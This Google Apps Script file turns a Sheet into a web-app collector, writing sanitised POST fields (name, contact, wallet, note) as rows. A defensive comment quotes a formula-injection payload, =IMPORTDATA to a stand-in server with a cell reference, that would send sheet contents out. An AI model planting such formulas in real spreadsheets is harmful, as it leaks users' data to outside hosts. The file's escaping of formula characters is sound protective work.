// Paste this file into the Apps Script editor of a Google Sheet (Extensions → Apps Script) and deploy it as a web app.
// Every POST it receives becomes one row in the "Responses" tab.

// ❓ Why a fixed list of columns?
// → The sheet only gets the fields named here, in this order. Anything else in the request is ignored,
//   so a stranger cannot add columns or shuffle your data. To collect another field, add its name here and in the form.
var COLUMNS = ["name", "contact", "wallet", "note"];
var SHEET_NAME = "Responses";
var MAX_LENGTH = 500;

function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    // ❓ Why new Date() here instead of a time sent by the browser?
    // → The browser's clock can be wrong or faked. The time the server received the row is the one you can trust.
    var row = [new Date()];
    for (var i = 0; i < COLUMNS.length; i++) row.push(clean_(data[COLUMNS[i]]));
    // ❓ What if two people submit at the same moment?
    // → appendRow is atomic: Sheets finds the last row and writes to it in one step, so two submissions cannot land on the same row.
    getSheet_().appendRow(row);
    return json_({ ok: true });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  }
}

// Open the web app URL in a browser tab to check that the deployment is live.
function doGet() {
  return ContentService.createTextOutput("Sheet collector is running. Send it a POST.");
}

function getSheet_() {
  var book = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = book.getSheetByName(SHEET_NAME) || book.insertSheet(SHEET_NAME);
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(["time"].concat(COLUMNS));
    sheet.setFrozenRows(1);
  }
  return sheet;
}

// ❓ Why not write the text exactly as it arrives?
// → A cell that starts with = + - or @ is run as a formula. Someone could submit =IMPORTDATA("https://their-server/?" & A2)
//   and make your sheet send its contents out. A leading apostrophe tells Sheets the cell is plain text.
//   The length limit stops one request from filling a cell with megabytes of text.
function clean_(value) {
  var text = String(value == null ? "" : value).slice(0, MAX_LENGTH);
  return /^[=+\-@]/.test(text) ? "'" + text : text;
}

function json_(body) {
  return ContentService.createTextOutput(JSON.stringify(body)).setMimeType(ContentService.MimeType.JSON);
}
